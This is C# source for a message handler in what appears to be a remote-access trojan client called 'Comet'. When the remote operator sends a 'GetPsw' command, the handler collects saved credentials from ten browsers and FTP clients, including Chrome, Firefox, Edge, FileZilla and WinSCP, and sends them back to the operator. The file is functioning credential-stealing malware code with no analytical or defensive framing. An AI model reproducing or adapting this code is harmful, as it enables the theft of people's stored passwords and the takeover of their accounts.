using Comet.Client.Recovery;
using Comet.Client.Recovery.Browsers;
using Comet.Client.Recovery.FtpClients;
using Comet.Common.Messages;
using Comet.Common.Models;
using Comet.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace Comet.Client.Messages
{
    public class PswHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetPsw;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPsw msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetPsw message)
        {
            List<SaveUser> recovered = new List<SaveUser>();

            var passReaders = new IUsers[]
            {
                new GetBrave(),
                new GetChrome(),
                new GetOpera(),
                new GetOperaGX(),
                new GetEdge(),
                new GetYandex(), 
                new GetFirefox(), 
                new GetInternetExplorer(), 
                new GetFileZilla(), 
                new GetWinScp()
            };

            foreach (var passReader in passReaders)
            {
                try
                {
                    recovered.AddRange(passReader.ReadAccounts());
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }
            }

            client.Send(new GetPswsResponse { SaveUsers = recovered });
        }
    }
}
